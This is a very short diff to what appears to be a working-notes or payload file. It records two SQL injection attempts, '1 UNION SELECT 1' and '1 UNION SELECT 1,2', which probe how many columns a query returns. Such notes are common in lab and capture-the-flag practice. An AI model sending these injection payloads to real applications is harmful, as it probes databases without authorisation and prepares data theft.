@@ -1,2 +1,4 @@
 # 1st try
 1 UNION SELECT 1
+# 2nd try
+1 UNION SELECT 1,2
